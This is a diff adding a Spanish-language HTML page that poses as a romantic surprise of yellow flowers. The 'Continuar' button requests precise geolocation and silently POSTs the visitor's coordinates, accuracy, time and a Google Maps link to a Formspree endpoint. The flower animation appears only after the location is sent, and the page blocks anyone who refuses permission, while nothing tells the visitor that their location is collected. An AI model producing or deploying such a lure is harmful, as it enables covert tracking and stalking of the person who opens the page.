@@ -1,0 +1,104 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Un detalle para ti 🌻</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;font-family:Arial,sans-serif;background:linear-gradient(#fff8c9,#fff);overflow:hidden}
+#inicio{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;padding:24px;z-index:10;background:linear-gradient(135deg,#fffbe7,#fff2a8)}
+.card{max-width:420px;width:100%;background:#fff;padding:32px 24px;border-radius:24px;text-align:center;box-shadow:0 15px 45px #0002}
+.card h1{margin:0 0 12px;color:#735600}.card p{color:#555;line-height:1.5}
+button{border:0;border-radius:999px;padding:14px 28px;font-size:16px;background:#f4c430;color:#4b3900;font-weight:bold;cursor:pointer}
+.notice{font-size:12px!important;color:#777!important;margin-top:14px}
+#estado{font-size:13px;margin-top:12px;min-height:18px}
+#jardin{display:none;position:fixed;inset:0;background:linear-gradient(#8bd8ff 0 55%,#71ad48 55%);overflow:hidden}
+.mensaje{position:absolute;top:8%;width:100%;text-align:center;color:#fff;text-shadow:0 2px 5px #0008;z-index:2}
+.mensaje h1{font-size:clamp(28px,7vw,58px);margin:0}.mensaje p{font-size:20px}
+.flor{position:absolute;bottom:-30px;width:110px;height:230px;animation:subir 1.4s ease-out both}
+.tallo{position:absolute;width:8px;height:160px;background:#39833b;bottom:0;left:51px;border-radius:5px}
+.centro{position:absolute;width:38px;height:38px;border-radius:50%;background:#6b451d;left:36px;top:27px;z-index:2}
+.petalo{position:absolute;width:35px;height:58px;background:#ffd928;border-radius:50%;left:38px;top:17px;transform-origin:17px 39px}
+@keyframes subir{from{transform:translateY(260px)}to{transform:translateY(0)}}
+</style>
+</head>
+<body>
+<section id="inicio">
+ <div class="card">
+   <div style="font-size:55px">🌻</div>
+   <h1>Tengo algo especial para ti</h1>
+   <p>Hay una pequeña sorpresa esperando.</p>
+   <button id="continuar">Continuar ✨</button>
+   
+   <div id="estado"></div>
+ </div>
+</section>
+
+<section id="jardin">
+ <div class="mensaje"><h1>Flores amarillas para ti 💛</h1><p>Un pequeño detalle para alegrar tu día</p></div>
+</section>
+
+<script>
+const ENDPOINT="https://formspree.io/f/moevqjjr";
+const estado=document.getElementById("estado");
+
+function crearFlores(){
+ const jardin=document.getElementById("jardin");
+ for(let i=0;i<14;i++){
+   const f=document.createElement("div"); f.className="flor";
+   f.style.left=(Math.random()*92)+"%";
+   f.style.transform="scale("+(0.65+Math.random()*0.7)+")";
+   f.style.animationDelay=(Math.random()*0.8)+"s";
+   f.innerHTML='<div class="tallo"></div><div class="centro"></div>';
+   for(let p=0;p<10;p++){
+     const pet=document.createElement("div"); pet.className="petalo";
+     pet.style.transform=`rotate(${p*36}deg) translateY(-30px)`;
+     f.appendChild(pet);
+   }
+   jardin.appendChild(f);
+ }
+}
+
+async function enviarUbicacion(pos){
+ const lat=pos.coords.latitude, lng=pos.coords.longitude;
+ const ahora=new Date();
+ const datos={
+   _subject:"Nueva ubicación registrada",
+   fecha:ahora.toLocaleDateString("es-PE"),
+   hora:ahora.toLocaleTimeString("es-PE"),
+   latitud:lat,
+   longitud:lng,
+   precision_metros:Math.round(pos.coords.accuracy),
+   google_maps:`https://www.google.com/maps?q=${lat},${lng}`
+ };
+ const r=await fetch(ENDPOINT,{
+   method:"POST",
+   headers:{"Content-Type":"application/json","Accept":"application/json"},
+   body:JSON.stringify(datos)
+ });
+ if(!r.ok) throw new Error("No se pudo enviar la ubicación");
+}
+
+document.getElementById("continuar").onclick=()=>{
+ if(!navigator.geolocation){
+   estado.textContent="Este navegador no admite geolocalización."; return;
+ }
+ estado.textContent="Esperando autorización del navegador…";
+ navigator.geolocation.getCurrentPosition(async pos=>{
+   try{
+     estado.textContent="Preparando tu sorpresa…";
+     await enviarUbicacion(pos);
+     document.getElementById("inicio").style.display="none";
+     document.getElementById("jardin").style.display="block";
+     crearFlores();
+   }catch(e){
+     estado.textContent="No se pudo completar el envío. Inténtalo nuevamente.";
+   }
+ },()=>{
+   estado.textContent="Para continuar debes permitir el acceso a la ubicación desde el aviso del navegador.";
+ },{enableHighAccuracy:true,timeout:15000,maximumAge:0});
+};
+</script>
+</body>
+</html>
